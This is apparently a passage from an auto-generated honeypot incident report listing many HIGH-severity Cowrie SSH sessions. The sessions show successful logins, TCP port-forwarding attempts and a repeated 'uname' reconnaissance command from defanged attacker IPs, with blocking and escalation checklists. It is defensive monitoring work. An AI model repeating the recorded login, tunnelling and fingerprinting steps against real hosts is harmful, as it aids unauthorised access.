| Time (UTC) | Event |
|---|---|
| `2026-07-23 20:37:22` | `cowrie.session.connect` |
| `2026-07-23 20:37:22` | `cowrie.client.version` |
| `2026-07-23 20:37:22` | `cowrie.client.kex` |
| `2026-07-23 20:37:24` | `cowrie.login.success` |
| `2026-07-23 20:37:25` | `cowrie.direct-tcpip.request` |
| `2026-07-23 20:37:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `60.175.91[.]53` to AbuseIPDB if not already reported
- [ ] Block `60.175.91[.]53` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0b0b94534abb

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-07-23 20:43 |
| **Last Seen** | 2026-07-23 20:43 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-23 20:43:58` | `cowrie.session.connect` |
| `2026-07-23 20:43:58` | `cowrie.client.version` |
| `2026-07-23 20:43:58` | `cowrie.client.kex` |
| `2026-07-23 20:43:58` | `cowrie.login.success` |
| `2026-07-23 20:43:58` | `cowrie.direct-tcpip.request` |
| `2026-07-23 20:43:59` | `cowrie.direct-tcpip.data` |
| `2026-07-23 20:43:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c027a75de3f9

| Field | Detail |
|---|---|
| **Source IP** | `107.135.117[.]245` |
| **First Seen** | 2026-07-23 20:45 |
| **Last Seen** | 2026-07-23 20:45 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-23 20:45:11` | `cowrie.session.connect` |
| `2026-07-23 20:45:11` | `cowrie.client.version` |
| `2026-07-23 20:45:11` | `cowrie.client.kex` |
| `2026-07-23 20:45:12` | `cowrie.login.success` |
| `2026-07-23 20:45:13` | `cowrie.direct-tcpip.request` |
| `2026-07-23 20:45:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `107.135.117[.]245` to AbuseIPDB if not already reported
- [ ] Block `107.135.117[.]245` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4fac36a6b185

| Field | Detail |
|---|---|
| **Source IP** | `213.33.204[.]130` |
| **First Seen** | 2026-07-23 20:45 |
| **Last Seen** | 2026-07-23 20:45 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-23 20:45:18` | `cowrie.session.connect` |
| `2026-07-23 20:45:18` | `cowrie.client.version` |
| `2026-07-23 20:45:18` | `cowrie.client.kex` |
| `2026-07-23 20:45:19` | `cowrie.login.success` |
| `2026-07-23 20:45:20` | `cowrie.direct-tcpip.request` |
| `2026-07-23 20:45:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `213.33.204[.]130` to AbuseIPDB if not already reported
- [ ] Block `213.33.204[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-655a75266874

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]246` |
| **First Seen** | 2026-07-23 20:47 |
| **Last Seen** | 2026-07-23 20:47 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-23 20:47:15` | `cowrie.session.connect` |
| `2026-07-23 20:47:15` | `cowrie.client.version` |
| `2026-07-23 20:47:16` | `cowrie.client.kex` |
| `2026-07-23 20:47:16` | `cowrie.login.success` |
| `2026-07-23 20:47:17` | `cowrie.session.params` |
| `2026-07-23 20:47:17` | `cowrie.command.input` |
| `2026-07-23 20:47:17` | `cowrie.log.closed` |
| `2026-07-23 20:47:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]246` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]246` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-621fbe734d03

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]246` |
| **First Seen** | 2026-07-23 20:47 |
| **Last Seen** | 2026-07-23 20:47 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-23 20:47:21` | `cowrie.session.connect` |
| `2026-07-23 20:47:21` | `cowrie.client.version` |
| `2026-07-23 20:47:21` | `cowrie.client.kex` |
| `2026-07-23 20:47:22` | `cowrie.login.success` |
| `2026-07-23 20:47:22` | `cowrie.session.params` |
| `2026-07-23 20:47:22` | `cowrie.command.input` |
| `2026-07-23 20:47:22` | `cowrie.log.closed` |
| `2026-07-23 20:47:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]246` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]246` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b437fcd4d18b

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]246` |
| **First Seen** | 2026-07-23 20:47 |
| **Last Seen** | 2026-07-23 20:47 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-23 20:47:27` | `cowrie.session.connect` |
| `2026-07-23 20:47:27` | `cowrie.client.version` |
| `2026-07-23 20:47:27` | `cowrie.client.kex` |
| `2026-07-23 20:47:27` | `cowrie.login.success` |
| `2026-07-23 20:47:28` | `cowrie.session.params` |
| `2026-07-23 20:47:28` | `cowrie.command.input` |
| `2026-07-23 20:47:28` | `cowrie.log.closed` |
| `2026-07-23 20:47:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]246` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]246` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0d7bc0ef85c2

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]246` |
| **First Seen** | 2026-07-23 20:47 |
| **Last Seen** | 2026-07-23 20:47 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-23 20:47:33` | `cowrie.session.connect` |
| `2026-07-23 20:47:33` | `cowrie.client.version` |
| `2026-07-23 20:47:33` | `cowrie.client.kex` |
| `2026-07-23 20:47:33` | `cowrie.login.success` |
| `2026-07-23 20:47:34` | `cowrie.session.params` |
| `2026-07-23 20:47:34` | `cowrie.command.input` |
| `2026-07-23 20:47:34` | `cowrie.log.closed` |
| `2026-07-23 20:47:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]246` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]246` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-788b34ee91ef

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]246` |
| **First Seen** | 2026-07-23 20:47 |
| **Last Seen** | 2026-07-23 20:47 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-23 20:47:38` | `cowrie.session.connect` |
| `2026-07-23 20:47:38` | `cowrie.client.version` |
| `2026-07-23 20:47:38` | `cowrie.client.kex` |
| `2026-07-23 20:47:38` | `cowrie.login.success` |
| `2026-07-23 20:47:39` | `cowrie.session.params` |
| `2026-07-23 20:47:39` | `cowrie.command.input` |
| `2026-07-23 20:47:39` | `cowrie.log.closed` |
| `2026-07-23 20:47:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]246` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]246` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c6ff9ac78b82

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]246` |
| **First Seen** | 2026-07-23 20:47 |
| **Last Seen** | 2026-07-23 20:47 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-23 20:47:44` | `cowrie.session.connect` |
| `2026-07-23 20:47:44` | `cowrie.client.version` |
| `2026-07-23 20:47:44` | `cowrie.client.kex` |
| `2026-07-23 20:47:44` | `cowrie.login.success` |
| `2026-07-23 20:47:45` | `cowrie.session.params` |
| `2026-07-23 20:47:45` | `cowrie.command.input` |
| `2026-07-23 20:47:45` | `cowrie.log.closed` |
| `2026-07-23 20:47:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]246` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]246` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2dcc50ff0f54

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]246` |
| **First Seen** | 2026-07-23 20:47 |
| **Last Seen** | 2026-07-23 20:47 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-23 20:47:49` | `cowrie.session.connect` |
| `2026-07-23 20:47:49` | `cowrie.client.version` |
| `2026-07-23 20:47:49` | `cowrie.client.kex` |
| `2026-07-23 20:47:49` | `cowrie.login.success` |
| `2026-07-23 20:47:50` | `cowrie.session.params` |
| `2026-07-23 20:47:50` | `cowrie.command.input` |
| `2026-07-23 20:47:50` | `cowrie.log.closed` |
| `2026-07-23 20:47:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]246` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]246` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-72aac9af4b78

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]246` |
| **First Seen** | 2026-07-23 20:47 |
| **Last Seen** | 2026-07-23 20:47 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-23 20:47:54` | `cowrie.session.connect` |
| `2026-07-23 20:47:54` | `cowrie.client.version` |
| `2026-07-23 20:47:54` | `cowrie.client.kex` |
| `2026-07-23 20:47:55` | `cowrie.login.success` |
| `2026-07-23 20:47:56` | `cowrie.session.params` |
| `2026-07-23 20:47:56` | `cowrie.command.input` |
| `2026-07-23 20:47:56` | `cowrie.log.closed` |
| `2026-07-23 20:47:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]246` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]246` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d2bf070696d8

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]246` |
| **First Seen** | 2026-07-23 20:48 |
| **Last Seen** | 2026-07-23 20:48 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-23 20:48:00` | `cowrie.session.connect` |
| `2026-07-23 20:48:00` | `cowrie.client.version` |
| `2026-07-23 20:48:00` | `cowrie.client.kex` |
| `2026-07-23 20:48:00` | `cowrie.login.success` |
| `2026-07-23 20:48:01` | `cowrie.session.params` |
| `2026-07-23 20:48:01` | `cowrie.command.input` |
| `2026-07-23 20:48:01` | `cowrie.log.closed` |
| `2026-07-23 20:48:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]246` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]246` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b17c4eb98eee

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]246` |
| **First Seen** | 2026-07-23 20:48 |
| **Last Seen** | 2026-07-23 20:48 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-23 20:48:05` | `cowrie.session.connect` |
| `2026-07-23 20:48:05` | `cowrie.client.version` |
| `2026-07-23 20:48:06` | `cowrie.client.kex` |
| `2026-07-23 20:48:06` | `cowrie.login.success` |
| `2026-07-23 20:48:07` | `cowrie.session.params` |
| `2026-07-23 20:48:07` | `cowrie.command.input` |
| `2026-07-23 20:48:07` | `cowrie.log.closed` |
| `2026-07-23 20:48:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]246` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]246` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2395e3ef4b46

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]246` |
| **First Seen** | 2026-07-23 20:48 |
| **Last Seen** | 2026-07-23 20:48 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-23 20:48:11` | `cowrie.session.connect` |
| `2026-07-23 20:48:11` | `cowrie.client.version` |
| `2026-07-23 20:48:11` | `cowrie.client.kex` |
| `2026-07-23 20:48:12` | `cowrie.login.success` |
| `2026-07-23 20:48:13` | `cowrie.session.params` |
| `2026-07-23 20:48:13` | `cowrie.command.input` |
| `2026-07-23 20:48:13` | `cowrie.log.closed` |
| `2026-07-23 20:48:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]246` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]246` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-afb229db3759

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]246` |
| **First Seen** | 2026-07-23 20:48 |
| **Last Seen** | 2026-07-23 20:48 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-23 20:48:17` | `cowrie.session.connect` |
| `2026-07-23 20:48:17` | `cowrie.client.version` |
| `2026-07-23 20:48:17` | `cowrie.client.kex` |
| `2026-07-23 20:48:17` | `cowrie.login.success` |
| `2026-07-23 20:48:18` | `cowrie.session.params` |
| `2026-07-23 20:48:18` | `cowrie.command.input` |
| `2026-07-23 20:48:18` | `cowrie.log.closed` |
| `2026-07-23 20:48:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]246` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]246` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-96b3f1fcbdee

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]246` |
| **First Seen** | 2026-07-23 20:48 |
| **Last Seen** | 2026-07-23 20:48 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-23 20:48:23` | `cowrie.session.connect` |
| `2026-07-23 20:48:23` | `cowrie.client.version` |
| `2026-07-23 20:48:23` | `cowrie.client.kex` |
| `2026-07-23 20:48:23` | `cowrie.login.success` |
| `2026-07-23 20:48:24` | `cowrie.session.params` |
| `2026-07-23 20:48:24` | `cowrie.command.input` |
| `2026-07-23 20:48:24` | `cowrie.log.closed` |
| `2026-07-23 20:48:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]246` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]246` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4c4ad584f763

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]246` |
| **First Seen** | 2026-07-23 20:48 |
| **Last Seen** | 2026-07-23 20:48 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-23 20:48:28` | `cowrie.session.connect` |
| `2026-07-23 20:48:28` | `cowrie.client.version` |
| `2026-07-23 20:48:28` | `cowrie.client.kex` |
| `2026-07-23 20:48:28` | `cowrie.login.success` |
| `2026-07-23 20:48:29` | `cowrie.session.params` |
| `2026-07-23 20:48:29` | `cowrie.command.input` |
| `2026-07-23 20:48:29` | `cowrie.log.closed` |
| `2026-07-23 20:48:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]246` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]246` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e91ced31902a

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]246` |
| **First Seen** | 2026-07-23 20:48 |
| **Last Seen** | 2026-07-23 20:48 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-23 20:48:33` | `cowrie.session.connect` |
| `2026-07-23 20:48:33` | `cowrie.client.version` |
| `2026-07-23 20:48:33` | `cowrie.client.kex` |
| `2026-07-23 20:48:34` | `cowrie.login.success` |
| `2026-07-23 20:48:34` | `cowrie.session.params` |
| `2026-07-23 20:48:34` | `cowrie.command.input` |
| `2026-07-23 20:48:34` | `cowrie.log.closed` |
| `2026-07-23 20:48:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]246` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]246` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5eed51bf46d2

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]246` |
| **First Seen** | 2026-07-23 20:48 |
| **Last Seen** | 2026-07-23 20:48 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-23 20:48:39` | `cowrie.session.connect` |
| `2026-07-23 20:48:39` | `cowrie.client.version` |
| `2026-07-23 20:48:39` | `cowrie.client.kex` |
| `2026-07-23 20:48:39` | `cowrie.login.success` |
| `2026-07-23 20:48:40` | `cowrie.session.params` |
| `2026-07-23 20:48:40` | `cowrie.command.input` |
| `2026-07-23 20:48:40` | `cowrie.log.closed` |
| `2026-07-23 20:48:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]246` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]246` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c80864f25d09

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]246` |
| **First Seen** | 2026-07-23 20:48 |
| **Last Seen** | 2026-07-23 20:48 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-23 20:48:44` | `cowrie.session.connect` |
| `2026-07-23 20:48:44` | `cowrie.client.version` |
| `2026-07-23 20:48:44` | `cowrie.client.kex` |
| `2026-07-23 20:48:45` | `cowrie.login.success` |
| `2026-07-23 20:48:46` | `cowrie.session.params` |
| `2026-07-23 20:48:46` | `cowrie.command.input` |
| `2026-07-23 20:48:46` | `cowrie.log.closed` |
| `2026-07-23 20:48:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]246` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]246` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-657b5d10cd54

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]246` |
| **First Seen** | 2026-07-23 20:48 |
| **Last Seen** | 2026-07-23 20:48 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-23 20:48:50` | `cowrie.session.connect` |
| `2026-07-23 20:48:50` | `cowrie.client.version` |
| `2026-07-23 20:48:50` | `cowrie.client.kex` |
| `2026-07-23 20:48:50` | `cowrie.login.success` |
| `2026-07-23 20:48:51` | `cowrie.session.params` |
| `2026-07-23 20:48:51` | `cowrie.command.input` |
| `2026-07-23 20:48:51` | `cowrie.log.closed` |
| `2026-07-23 20:48:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]246` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]246` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ed666176d9f8

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]246` |
| **First Seen** | 2026-07-23 20:48 |
| **Last Seen** | 2026-07-23 20:48 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-23 20:48:55` | `cowrie.session.connect` |
| `2026-07-23 20:48:55` | `cowrie.client.version` |
| `2026-07-23 20:48:55` | `cowrie.client.kex` |
| `2026-07-23 20:48:56` | `cowrie.login.success` |
| `2026-07-23 20:48:56` | `cowrie.session.params` |
| `2026-07-23 20:48:56` | `cowrie.command.input` |
| `2026-07-23 20:48:57` | `cowrie.log.closed` |
| `2026-07-23 20:48:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]246` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]246` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2f9bb656a8cb

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]246` |
| **First Seen** | 2026-07-23 20:49 |
| **Last Seen** | 2026-07-23 20:49 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-23 20:49:00` | `cowrie.session.connect` |
| `2026-07-23 20:49:00` | `cowrie.client.version` |
| `2026-07-23 20:49:01` | `cowrie.client.kex` |
| `2026-07-23 20:49:01` | `cowrie.login.success` |
| `2026-07-23 20:49:02` | `cowrie.session.params` |
| `2026-07-23 20:49:02` | `cowrie.command.input` |
| `2026-07-23 20:49:02` | `cowrie.log.closed` |
| `2026-07-23 20:49:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]246` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]246` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-469f2f05cb72

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]246` |
| **First Seen** | 2026-07-23 20:49 |
| **Last Seen** | 2026-07-23 20:49 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-23 20:49:06` | `cowrie.session.connect` |
| `2026-07-23 20:49:06` | `cowrie.client.version` |
| `2026-07-23 20:49:06` | `cowrie.client.kex` |
| `2026-07-23 20:49:07` | `cowrie.login.success` |
| `2026-07-23 20:49:07` | `cowrie.session.params` |
| `2026-07-23 20:49:07` | `cowrie.command.input` |
| `2026-07-23 20:49:08` | `cowrie.log.closed` |
| `2026-07-23 20:49:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]246` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]246` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-93851d627b6e

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]246` |
| **First Seen** | 2026-07-23 20:49 |
| **Last Seen** | 2026-07-23 20:49 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-23 20:49:12` | `cowrie.session.connect` |
| `2026-07-23 20:49:12` | `cowrie.client.version` |
| `2026-07-23 20:49:12` | `cowrie.client.kex` |
| `2026-07-23 20:49:12` | `cowrie.login.success` |
| `2026-07-23 20:49:13` | `cowrie.session.params` |
| `2026-07-23 20:49:13` | `cowrie.command.input` |
| `2026-07-23 20:49:13` | `cowrie.log.closed` |
| `2026-07-23 20:49:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]246` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]246` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
